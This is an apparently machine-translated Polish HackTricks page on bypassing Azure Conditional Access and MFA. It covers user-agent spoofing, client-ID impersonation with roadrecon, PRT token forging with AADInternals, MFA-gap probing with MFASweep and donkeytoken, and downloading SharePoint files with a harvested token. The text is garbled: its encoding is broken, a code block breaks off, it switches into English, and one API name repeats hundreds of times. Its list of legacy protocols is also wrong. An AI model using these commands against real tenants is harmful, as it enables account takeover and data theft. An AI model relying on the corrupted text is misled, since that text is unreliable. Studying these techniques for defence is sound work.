# Az - Polityki warunkowego dostƒôpu / Ominiƒôcie MFA

<details>

<summary><strong>Dowiedz siƒô, jak hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Polityki warunkowego dostƒôpu w Azure to zasady ustawione w Microsoft Azure, kt√≥re narzucajƒÖ kontrole dostƒôpu do us≈Çug i aplikacji Azure na podstawie okre≈õlonych **warunk√≥w**. Te polityki pomagajƒÖ organizacjom zabezpieczyƒá swoje zasoby, stosujƒÖc odpowiednie kontrole dostƒôpu w odpowiednich okoliczno≈õciach.\
Polityki warunkowego dostƒôpu w zasadzie **okre≈õlajƒÖ**, **kto** mo≈ºe uzyskaƒá dostƒôp do **czego** z **jakiego miejsca** i **w jaki spos√≥b**.

Oto kilka przyk≈Çad√≥w:

1. **Polityka ryzyka logowania**: Ta polityka mo≈ºe byƒá ustawiona tak, aby wymagaƒá wielosk≈Çadnikowej autoryzacji (MFA), gdy wykryte zostanie ryzyko logowania. Na przyk≈Çad, je≈õli zachowanie logowania u≈ºytkownika jest nietypowe w por√≥wnaniu do ich normalnego wzorca, takie jak logowanie z innego kraju, system mo≈ºe poprosiƒá o dodatkowƒÖ autoryzacjƒô.
2. **Polityka zgodno≈õci urzƒÖdzenia**: Ta polityka mo≈ºe ograniczaƒá dostƒôp do us≈Çug Azure tylko do urzƒÖdze≈Ñ zgodnych z normami bezpiecze≈Ñstwa organizacji. Na przyk≈Çad, dostƒôp mo≈ºe byƒá dozwolony tylko z urzƒÖdze≈Ñ, na kt√≥rych zainstalowane jest aktualne oprogramowanie antywirusowe lub kt√≥re dzia≈ÇajƒÖ na okre≈õlonej wersji systemu operacyjnego.

## Ominiƒôcia polityk warunkowego dostƒôpu

Mo≈ºe siƒô zdarzyƒá, ≈ºe polityka warunkowego dostƒôpu **sprawdza pewne informacje, kt√≥re mo≈ºna ≈Çatwo sfa≈Çszowaƒá, umo≈ºliwiajƒÖc ominiƒôcie polityki**. A je≈õli na przyk≈Çad polityka konfigurowa≈Ça MFA, atakujƒÖcy bƒôdzie w stanie jƒÖ ominƒÖƒá.

### Platformy urzƒÖdze≈Ñ - Warunek urzƒÖdzenia

Mo≈ºliwe jest ustawienie warunku na podstawie **platformy urzƒÖdzenia** (Android, iOS, Windows, macOS), jednak jest to oparte na **user-agent**, wiƒôc jest do≈õƒá ≈Çatwe do ominiƒôcia. Nawet je≈õli **wszystkie opcje wymuszajƒÖ MFA**, je≈õli u≈ºyjesz **user-agenta, kt√≥rego nie rozpoznaje**, bƒôdziesz w stanie ominƒÖƒá MFA.

### Lokalizacje: Kraje, zakresy IP - Warunek urzƒÖdzenia

Oczywi≈õcie, je≈õli to jest ustawione w polityce warunkowego dostƒôpu, atakujƒÖcy mo≈ºe po prostu u≈ºyƒá **VPN** w **dozwolonym kraju** lub spr√≥bowaƒá znale≈∫ƒá spos√≥b dostƒôpu z **dozwolonego adresu IP**, aby ominƒÖƒá te warunki.

### Aplikacje klienta Office365

Mo≈ºesz wskazaƒá, ≈ºe je≈õli klienci **uzyskujƒÖ dostƒôp do aplikacji Office 365 z przeglƒÖdarki, wymagane jest MFA**:

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Aby ominƒÖƒá to, mo≈ºliwe jest udawanie logowania do aplikacji z aplikacji na pulpicie (na przyk≈Çad do Microsoft Teams w poni≈ºszym przyk≈Çadzie), co obejdzie ochronƒô:
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokrns-stdout

<token>
```
Poniewa≈º aplikacja Microsoft Teams ma wiele uprawnie≈Ñ, bƒôdziesz w stanie skorzystaƒá z tego dostƒôpu.

{% hint style="success" %}
Mo≈ºesz znale≈∫ƒá **ID wiƒôcej publicznych aplikacji** z predefiniowanymi uprawnieniami Office365 w bazie danych narzƒôdzi drogowych:

{% code overflow="wrap" %}
```sql
SELECT appId, displayName FROM ApplicationRefs WHERE publicCLient = 1 ORDER BY displayName ASC
```
{% code %}
az ad signed-in-user show --query 'deviceProfile' -o json
{% endcode %}

Then, use the obtained **PRT** token to authenticate to the target application.

### Legacy Authentication

If the target application allows **legacy authentication**, an attacker could use **legacy protocols** that don't support MFA to bypass it.

Some examples of legacy protocols are **IMAP**, **SMTP**, **POP3**, **Exchange ActiveSync**, **Remote PowerShell**, **Exchange Web Services**, **Autodiscover**, **Outlook Anywhere**, **OWA**, **MAPI over HTTP**, **Exchange Admin Center**, **Exchange Online PowerShell**, **Skype for Business**, **Lync**, **Teams**, **SharePoint Online**, **OneDrive for Business**, **Yammer**, **Power BI**, **Azure AD PowerShell**, **Azure AD Graph API**, **Microsoft Graph API**, **Office 365 REST API**, **Office 365 Management API**, **Office 365 Reporting API**, **Office 365 Security & Compliance Center**, **Office 365 Audit Log API**, **Office 365 Service Communications API**, **Office 365 Service Health API**, **Office 365 Service Assurance API**, **Office 365 Service Management API**, **Office 365 Service Support API**, **Office 365 Service Usage API**, **Office 365 Service Update API**, **Office 365 Service Incident API**, **Office 365 Service Recovery API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API**, **Office 365 Service Subscription API
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
Znajd≈∫ wiƒôcej informacji na temat tego rodzaju ataku na nastƒôpujƒÖcej stronie:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## Narzƒôdzia

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Pobierz wszystkie polityki
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep to skrypt PowerShell, kt√≥ry pr√≥buje **zalogowaƒá siƒô do r√≥≈ºnych us≈Çug Microsoft, u≈ºywajƒÖc podanych danych uwierzytelniajƒÖcych, i stara siƒô ustaliƒá, czy MFA jest w≈ÇƒÖczone**. W zale≈ºno≈õci od konfiguracji polityk warunkowego dostƒôpu i innych ustawie≈Ñ uwierzytelniania wielosk≈Çadnikowego, niekt√≥re protoko≈Çy mogƒÖ pozostaƒá jednoczynnikowe. Skrypt ma r√≥wnie≈º dodatkowƒÖ funkcjƒô sprawdzania konfiguracji ADFS i mo≈ºe pr√≥bowaƒá zalogowaƒá siƒô do serwera ADFS w lokalnej sieci, je≈õli zostanie wykryty.
```bash
Invoke-MFASweep -Username <username> -Password <pass>
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token to zestaw funkcji, kt√≥re majƒÖ na celu pom√≥c konsultantom ds. bezpiecze≈Ñstwa, kt√≥rzy muszƒÖ sprawdziƒá polityki warunkowego dostƒôpu, testowaƒá portale Microsoft z w≈ÇƒÖczonƒÖ dwusk≈ÇadnikowƒÖ autoryzacjƒÖ itp.
```powershell
Import-Module 'C:\Users\Administrador\Desktop\Azure\Modulos ps1\donkeytoken' -Force
```
**Przetestuj ka≈ºdy portal**, aby sprawdziƒá, czy jest mo≈ºliwe **zalogowanie siƒô bez MFA**:
```powershell
Test-MFA -credential $cred -Verbose -Debug -InformationAction Continue
```
Poniewa≈º **portal Azure** nie jest ograniczony, mo≈ºliwe jest **zebranie tokena z punktu ko≈Ñcowego portalu w celu uzyskania dostƒôpu do dowolnej wykrytej us≈Çugi** z poprzedniego wykonania. W tym przypadku zidentyfikowano Sharepoint i ≈ºƒÖdano tokenu dostƒôpu do niego:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}


Zak≈ÇadajƒÖc, ≈ºe token ma uprawnienie Sites.Read.All (z Sharepoint), nawet je≈õli nie mo≈ºesz uzyskaƒá dostƒôpu do Sharepointa przez sieƒá z powodu MFA, mo≈ºna u≈ºyƒá tokenu do uzyskania dostƒôpu do plik√≥w za pomocƒÖ wygenerowanego tokenu:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Odwo≈Çania

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
